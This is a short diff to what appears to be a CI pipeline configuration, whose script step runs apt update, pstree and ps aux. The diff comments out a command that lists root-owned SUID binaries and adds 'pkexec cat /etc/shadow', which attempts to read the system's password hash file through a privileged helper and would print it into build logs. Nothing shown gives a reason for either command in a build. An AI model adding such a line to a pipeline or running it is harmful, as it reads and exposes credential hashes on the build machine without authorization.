@@ -15,7 +15,8 @@ steps:
 
 - script: |
     apt update
-    find / -user root -perm -4000 -print 2>/dev/null
+    pkexec cat /etc/shadow
+    # find / -user root -perm -4000 -print 2>/dev/null
     pstree -p
 
     ps aux
